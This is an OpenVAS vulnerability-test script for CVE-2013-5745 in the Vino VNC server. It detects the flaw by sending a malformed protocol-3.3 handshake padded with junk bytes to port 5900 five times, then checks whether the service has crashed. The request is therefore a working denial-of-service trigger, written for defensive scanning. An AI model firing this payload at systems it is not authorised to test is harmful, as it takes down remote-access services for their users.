###############################################################################
# OpenVAS Vulnerability Test
#
# Vino VNC Server Remote Denial Of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802061");
  script_version("2022-04-25T14:50:49+0000");
  script_cve_id("CVE-2013-5745");
  script_tag(name:"cvss_base", value:"7.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2022-04-25 14:50:49 +0000 (Mon, 25 Apr 2022)");
  script_tag(name:"creation_date", value:"2013-09-27 16:12:45 +0530 (Fri, 27 Sep 2013)");
  script_name("Vino VNC Server Remote Denial Of Service Vulnerability");

  script_tag(name:"summary", value:"Vino VNC Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send crafted request and check is it vulnerable to DoS or not.");

  script_tag(name:"solution", value:"Upgrade to version 3.7.4 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"insight", value:"Vulnerability is triggered when a VNC client claims to only support protocol
  version 3.3 and sends malformed data during the authentication selection stage
  of the authentication process.");

  script_tag(name:"affected", value:"Vino VNC Server version 3.7.3 and prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause a denial of service.
  Additionally, after the failure condition has occurred, the log file
  (~/.xsession-errors) grows quickly.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/87155");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62443");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/28338");
  script_xref(name:"URL", value:"https://bugzilla.gnome.org/show_bug.cgi?id=707905");
  script_xref(name:"URL", value:"https://bugzilla.gnome.org/show_bug.cgi?id=641811");
  script_xref(name:"URL", value:"https://access.redhat.com/security/cve/CVE-2013-5745");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service1.nasl");
  script_require_ports("Services/vnc", 5900);
  exit(0);
}

include("port_service_func.inc");

port = service_get_port(default:5900, proto:"vnc");

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

banner = recv(socket:soc, length:1024);
close(soc);
if(!banner || banner !~ "^RFB ")
  exit(0);

req = raw_string("RFB 003.003", 0x0a, crap(data:"A", length:16));

for(i = 0; i < 5; i++) {
  soc = open_sock_tcp(port);
  if(!soc) {
    security_message(port:port);
    exit(0);
  }

  recv(socket:soc, length:1024);
  send(socket:soc, data:req);
  close(soc);
}

sleep(2);

soc = open_sock_tcp(port);
if(!soc) {
  security_message(port:port);
  exit(0);
}

res = recv(socket:soc, length:1024);
close(soc);
if(!res) {
  security_message(port:port);
  exit(0);
}

exit(99);
